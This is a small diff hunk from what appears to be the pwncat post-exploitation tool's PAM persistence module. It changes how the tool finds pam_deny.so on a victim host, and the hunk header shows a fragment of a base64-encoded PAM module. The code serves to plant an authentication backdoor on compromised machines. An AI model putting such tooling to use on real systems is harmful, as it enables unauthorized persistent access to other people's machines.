@@ -114,7 +114,9 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
             pam_modules = "/usr/lib/security"
             try:
                 results = (
-                    pwncat.victim.env(["find", "/", "-name", "pam_deny.so"])
+                    pwncat.victim.run(
+                        "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'"
+                    )
                     .strip()
                     .decode("utf-8")
                 )
